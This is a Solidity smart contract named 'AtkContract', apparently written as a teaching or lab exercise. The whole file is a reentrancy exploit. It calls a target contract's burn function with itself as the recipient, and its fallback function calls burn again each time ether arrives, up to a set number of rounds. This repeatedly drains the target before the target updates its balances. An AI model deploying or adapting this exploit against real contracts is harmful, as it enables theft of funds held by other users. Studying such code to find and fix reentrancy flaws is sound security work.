// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.4.17 <0.9.0;

// import "./ERC20_token.sol";

contract AtkContract {

    address tokenOwner;
    address payable targetAddress;
    address payable attacker;
    uint256 amount;
    uint8 maxIter = 2;
    uint8 currIter;

    // EIP20 targetContract;

    event AttackerContractBalance(address indexed _addr, uint256 _balance);

    constructor() {
        tokenOwner = msg.sender;
        attacker = payable(address(this));
        emit AttackerContractBalance(attacker, attacker.balance);
    }

    function getAttackerContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setTargetAndAmount(address payable _target, uint256 _amount) public {
        // targetContract = EIP20(_target);
        targetAddress = _target;
        amount = _amount;
    }
    
    function setMaxIter(uint8 _maxIter) public {
        maxIter = _maxIter;
    }
    
    function resetAndRun() public {
        currIter = 0;
        run();
        emit AttackerContractBalance(address(this), address(this).balance);
    }

    function run() internal {
        (bool success, ) = targetAddress.call(abi.encodeWithSignature("burn(address,uint256)", attacker, amount));
        // bool success = targetContract.burn(attacker, amount);
        require (success, "Burn didn't work...");
    }

    fallback() external payable {
        ++currIter;
        if (currIter != maxIter) {
            run();
        }
    }
}